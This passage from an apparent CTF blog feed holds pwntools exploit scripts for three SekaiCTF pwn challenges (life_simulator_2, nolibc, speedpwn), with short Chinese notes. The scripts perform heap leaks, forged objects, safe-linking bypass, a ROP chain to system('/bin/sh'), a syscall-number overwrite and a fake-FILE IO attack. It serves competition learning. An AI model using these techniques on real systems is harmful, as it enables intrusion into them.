class="hljs-built_in">str</span>(project_profit_per_week)]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_project</span>(<span class="hljs-params">company_name, project_name</span>):<br>    sl(<span class="hljs-string">&#x27;remove_project &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([company_name, project_name]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hire_worker</span>(<span class="hljs-params">company_name, project_name, worker_name, salary</span>):<br>    sl(<span class="hljs-string">&#x27;hire_worker &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([company_name, project_name, worker_name, <span class="hljs-built_in">str</span>(salary)]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fire_worker</span>(<span class="hljs-params">worker_name</span>):<br>    sl(<span class="hljs-string">&#x27;fire_worker &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([worker_name]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_worker</span>(<span class="hljs-params">worker_name, new_project_name</span>):<br>    sl(<span class="hljs-string">&#x27;move_worker &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([worker_name, new_project_name]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker_info</span>(<span class="hljs-params">worker_name</span>):<br>    sl(<span class="hljs-string">&#x27;worker_info &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([worker_name]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">elapse_week</span>():<br>    sl(<span class="hljs-string">&#x27;elapse_week&#x27;</span>)<br><br><span class="hljs-comment">#p = process(&#x27;./life_simulator_2&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;life-simulator-2.chals.sekai.team&#x27;</span>,<span class="hljs-number">1337</span>,ssl=<span class="hljs-literal">True</span>)<br><br>add_company(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>, <span class="hljs-number">1000</span>)<br><br>elapse_week()<br>elapse_week()<br>elapse_week()<br><br>sell_company(<span class="hljs-string">&#x27;test&#x27;</span>)<br><br>add_company(<span class="hljs-string">&#x27;pureland&#x27;</span>, <span class="hljs-number">10000</span>)<br>add_projct(<span class="hljs-string">&#x27;pureland&#x27;</span>, <span class="hljs-string">&#x27;666&#x27;</span>, <span class="hljs-number">1000000</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    hire_worker(<span class="hljs-string">&#x27;pureland&#x27;</span>, <span class="hljs-string">&#x27;666&#x27;</span>, <span class="hljs-string">&#x27;worker%d&#x27;</span>%i, <span class="hljs-number">100</span>)<br><br>elapse_week()<br>elapse_week()<br><br>sell_company(<span class="hljs-string">&#x27;pureland&#x27;</span>)<br><br><br>add_company(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_company(<span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-number">1000</span>)<br><br>add_projct(<span class="hljs-string">&#x27;fake_com&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-number">1000</span>)<br>worker_info(<span class="hljs-string">&#x27;worker0&#x27;</span>)<br><br>ru(<span class="hljs-string">&#x27;Project workers count: &#x27;</span>)<br>heapbase=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)) * <span class="hljs-number">8</span> - <span class="hljs-number">0x133e0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heapbase))<br><br><br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>, <span class="hljs-number">1000</span>)<br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x500</span>, <span class="hljs-number">1000</span>)<br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">1000</span>)<br>remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arr</span>(<span class="hljs-params">addr,fake_com</span>):<br>    add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">1000</span>)<br>    add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">1000</span>)<br>    sell_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>)<br>    remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>    remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>)<br><br>    pl = p64(addr) + p64(<span class="hljs-number">8</span>)<br>    pl = pl.ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pl += p64(fake_com)[:-<span class="hljs-number">1</span>]<br>    sl(<span class="hljs-string">b&#x27;hire_worker test c &#x27;</span>+pl+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br>    worker_info(<span class="hljs-string">&#x27;worker0&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;fire_worker &#x27;</span>+pl)<br><br>arr(heapbase+<span class="hljs-number">0x16280</span>,heapbase+<span class="hljs-number">0x13670</span>)<br><br>ru(<span class="hljs-string">&#x27;Project name: &#x27;</span>)<br>libcbase=u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))-<span class="hljs-number">0x204130</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>, <span class="hljs-number">1000</span>)<br><br>arr(libcbase+<span class="hljs-number">0x20ad58</span>,heapbase+<span class="hljs-number">0x1000</span>)<br><br>ru(<span class="hljs-string">&#x27;Project name: &#x27;</span>)<br>stack=u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>, <span class="hljs-number">1000</span>)<br><br>p_fake_com=heapbase+<span class="hljs-number">0x15b50</span><br>p_fake_arr=p_fake_com+<span class="hljs-number">0x48</span><br>p_fake_pj=p_fake_arr+<span class="hljs-number">8</span><br>p_ob=heapbase+<span class="hljs-number">0x280</span><br>fake_com=p64(heapbase)+p64(<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>fake_com+=p64(p_fake_arr)+p64(p_fake_arr+<span class="hljs-number">8</span>)*<span class="hljs-number">2</span><br>fake_com_arr=p64(p_fake_pj)<br>fake_pj=p64(p_fake_pj+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">7</span>)+<span class="hljs-string">b&#x27;fakeobj\x00&#x27;</span><br>fake_pj+=p64(<span class="hljs-number">100</span>)<br>fake_pj+=p64(p_ob)*<span class="hljs-number">2</span>+p64(p_ob+<span class="hljs-number">8</span>)<br>sl(<span class="hljs-string">b&#x27;hire_worker test c &#x27;</span>+fake_com+fake_com_arr+fake_pj+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br><br><br>hire_worker(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x450</span>, <span class="hljs-number">100</span>)<br>fire_worker(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">1000</span>)<br>sell_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>)<br>remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>)<br>pl = p64(libcbase) + p64(<span class="hljs-number">8</span>)<br>pl = pl.ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pl += p64(p_fake_com)[:-<span class="hljs-number">1</span>]<br>sl(<span class="hljs-string">b&#x27;hire_worker test c &#x27;</span>+pl+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br><br><br>move_worker(<span class="hljs-string">&#x27;worker0&#x27;</span>,<span class="hljs-string">&#x27;fakeobj&#x27;</span>)<br><br><span class="hljs-comment"># 0x13850</span><br><br>add_projct(<span class="hljs-string">&#x27;test1&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-number">1000</span>)<br><br>pl=p64(heapbase)*(<span class="hljs-number">0x40</span>//<span class="hljs-number">8</span>)<br>pl+=p64(heapbase+<span class="hljs-number">0x160b0</span>)<br>pl+=p64(heapbase)*(<span class="hljs-number">0xd8</span>//<span class="hljs-number">8</span>)<br>pl+=p64(heapbase+<span class="hljs-number">0x13670</span>)+p64(heapbase+<span class="hljs-number">0x13670</span>)<br>pl+=p64(heapbase)*(<span class="hljs-number">0xf0</span>//<span class="hljs-number">8</span>)<br>pl+=p64(heapbase+<span class="hljs-number">0x13680</span>)+p64(<span class="hljs-number">5</span>)+<span class="hljs-string">b&#x27;test1\x00\x00\x00&#x27;</span><br>pl+=p64(heapbase+<span class="hljs-number">0x135a0</span>)+p64(<span class="hljs-number">0x3e8</span>)+p64(<span class="hljs-number">0</span>)<br>pl+=p64(heapbase+<span class="hljs-number">0x13490</span>)+p64(heapbase+<span class="hljs-number">0x13498</span>)*<span class="hljs-number">2</span><br>pl+=p64(heapbase)*(<span class="hljs-number">0x188</span>//<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)<br>pl+=p64(<span class="hljs-number">0x91</span>)<br>pl+=p64(((heapbase+<span class="hljs-number">0x13850</span>)&gt;&gt;<span class="hljs-number">12</span>)^(stack-<span class="hljs-number">0x4a0</span>-<span class="hljs-number">8</span>))[:-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(pl)))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>sl(<span class="hljs-string">b&#x27;hire_worker test1 c &#x27;</span>+pl+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>rdi=libcbase+<span class="hljs-number">0x10f75b</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))+libcbase<br>ret=libcbase+<span class="hljs-number">0x2882f</span><br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>rop_chain=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>rop_chain=rop_chain.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;hire_worker test1 c &#x27;</span>+rop_chain+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="nolibc"><a href="#nolibc" class="headerlink" title="nolibc"></a>nolibc</h1><p>top chunk没算0x10的头导致0x10的溢出，改系统调用号</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">name,passwd</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Username: &#x27;</span>,name)<br>    p.sendafter(<span class="hljs-string">b&#x27;Password: &#x27;</span>,passwd)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">name,passwd</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Username: &#x27;</span>,name)<br>    p.sendafter(<span class="hljs-string">b&#x27;Password: &#x27;</span>,passwd)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">sz,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter string length: &#x27;</span>,<span class="hljs-built_in">str</span>(sz).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter a string: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the index of the string to delete: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>(<span class="hljs-params">filename</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the filename: &#x27;</span>,filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">filename</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the filename: &#x27;</span>,filename)<br><br><br>p=process(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>register(<span class="hljs-string">b&#x27;lcpa\n&#x27;</span>,<span class="hljs-string">b&#x27;lcpa\n&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;lcpa\n&#x27;</span>,<span class="hljs-string">b&#x27;lcpa\n&#x27;</span>)<br>add(<span class="hljs-number">0x3f</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)       <span class="hljs-comment"># 1 0</span><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0xf</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># 1</span><br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x17</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment"># 1</span><br>view()<br>p.recvuntil(<span class="hljs-string">b&#x27;String 1: aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)<br>pie=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x90f0</span><br>log.info(<span class="hljs-string">&#x27;PIE: &#x27;</span>+<span class="hljs-built_in">hex</span>(pie))<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xb4</span>):<br>    add(<span class="hljs-number">0x100</span>-<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>)<br><br>add(<span class="hljs-number">0x3f</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">1</span>)+p32(<span class="hljs-number">59</span>)+p32(<span class="hljs-number">3</span>))<br><br>delete(<span class="hljs-number">0</span>)<br>load(<span class="hljs-string">b&#x27;/bin/sh\n&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="speedpwn"><a href="#speedpwn" class="headerlink" title="speedpwn"></a>speedpwn</h1><p>scanf输入+跳过输入，simulate利用栈上残留libc地址泄漏，fight伪造FILE结构体打io</p><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fight</span>(<span class="hljs-params">num</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;f&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Player plays: &#x27;</span>,<span class="hljs-built_in">str</span>(num).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">simulate</span>(<span class="hljs-params">play</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Bot number: &#x27;</span>,<span class="hljs-string">b&#x27;+&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Player number: &#x27;</span>,<span class="hljs-built_in">str</span>(play).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printg</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;p&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reseed</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;r&#x27;</span>)<br><br><br>p=process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess</span>():<br>    num=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> cnt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>        num=(<span class="hljs-number">1</span> &lt;&lt; cnt) - <span class="hljs-number">1</span><br>        simulate(num)<br>        p.recvuntil(<span class="hljs-string">b&#x27;Simulation result: &#x27;</span>)<br>        s=p.recvline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;You win!\n&#x27;</span>==s:<br>            <span class="hljs-keyword">break</span><br>    log.info(<span class="hljs-string">&quot;cnt of 1: &quot;</span>+<span class="hljs-built_in">str</span>(cnt))<br>    ret=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>        <span class="hljs-keyword">if</span> num==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">break</span><br>        simulate(ret|(num&lt;&lt;i))<br>        p.recvuntil(<span class="hljs-string">b&#x27;Simulation result: &#x27;</span>)<br>        s=p.recvline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Bot win!\n&#x27;</span>==s:<br>            ret|=<span class="hljs-number">1</span>&lt;&lt;(i-<span class="hljs-number">1</span>)<br>            num&gt;&gt;=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> ret<br><br>libcbase=guess()-<span class="hljs-number">0x955c2</span><br>log.info(<span class="hljs-string">&quot;libcbase: &quot;</span>+<span class="hljs-built_in">hex</span>(libcbase))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_byte</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> num&amp;<span class="hljs-number">1</span>==<span class="hljs-number">1</span>:<br>            fight((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">64</span>)-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            fight(<span class="hljs-number">0</span>)<br>        num&gt;&gt;=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_pl</span>(<span class="hljs-params">pl</span>):<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> pl:<br>        write_byte(item)<br><br><span class="hljs-comment"># _IO_file_xsgetn</span><br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.39.so&#x27;</span>)<br><br>p_fake_io=<span class="hljs-number">0x4040a0</span><br>p_fake_wfile=p_fake_io+<span class="hljs-number">0x100</span><br>p_fake_wfile_vtable=p_fake_wfile+<span class="hljs-number">0x100</span><br>p_fake_chunk=p_fake_wfile_vtable+<span class="hljs-number">0x100</span><br>io_wfile_jmp=libcbase+<span class="hljs-number">0x202228</span><br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>pl=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(p_fake_io)<br>fake_io=<span class="hljs-string">b&#x27;  sh&#x27;</span><br>fake_io=fake_io.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_io+=p64(p_fake_chunk)<br>fake_io=fake_io.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_io+=p64(p_fake_wfile)<br>fake_io=fake_io.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_io+=p64(io_wfile_jmp+<span class="hljs-number">0x18</span>-<span class="hljs-number">0x40</span>)<br>fake_wfile=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0</span>)<br>fake_wfile=fake_wfile.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wfile+=p64(<span class="hljs-number">0</span>)<br>fake_wfile=fake_wfile.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wfile+=p64(p_fake_wfile_vtable)<br>fake_wfile_vtable=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span>+p64(system)<br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br><br>pl+=fake_io.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pl+=fake_wfile.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pl+=fake_wfile_vtable.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pl+=fake_chunk<br><br>write_pl(pl)<br><br>reseed()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-1015 nftables栈溢出</title>
    <link href="/2024/08/23/cve-2022-1015/"/>
    <url>/2024/08/23/cve-2022-1015/</url>
    
